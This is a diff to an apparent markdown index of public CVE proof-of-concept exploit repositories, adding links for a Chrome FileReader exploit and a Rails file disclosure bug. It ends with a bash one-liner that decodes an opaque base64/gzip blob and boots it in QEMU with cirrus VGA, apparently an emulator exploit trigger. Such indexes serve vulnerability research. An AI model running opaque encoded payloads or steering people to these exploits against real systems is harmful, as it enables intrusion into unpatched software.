@@ -152,7 +152,11 @@ Some CVEs PoCs repos on github or internet.
 - Social Network Tabs Wordpress Plugin Vulnerability: [CVE-2018-20555](https://github.com/fs0c131y/CVE-2018-20555)
 - ES File Explorer Open Port Vulnerability: [CVE-2019-6447](https://github.com/fs0c131y/ESFileExplorerOpenPortVuln)
 - Atlassian Jira vulnerable: [CVE-2017-9506](https://github.com/random-robbie/Jira-Scan)
-- Chrome: [CVE-2019-5782](https://github.com/vngkv123/aSiagaming)
+- Chrome:
+  - [CVE-2019-5782](https://github.com/vngkv123/aSiagaming)
+  - [CVE-2019-5786](https://github.com/exodusintel/CVE-2019-5786): FileReader Exploit
+- [Google Books X-Hacking](https://medium.com/@terjanq/google-books-x-hacking-29c249862f19)
+- Ruby on Rails: File Content Disclosure on Rails - [CVE-2019-5418](https://github.com/mpgn/CVE-2019-5418)
 
 '''bash
 $ echo H4sICH0mqFkAA3BvYwDbweS/W8LxrMCuK8wbZN85bWh494VhFIwUELoKAIJvFIwAAgAA | base64 -d | gunzip > a && qemu-system-i386 -vga cirrus a
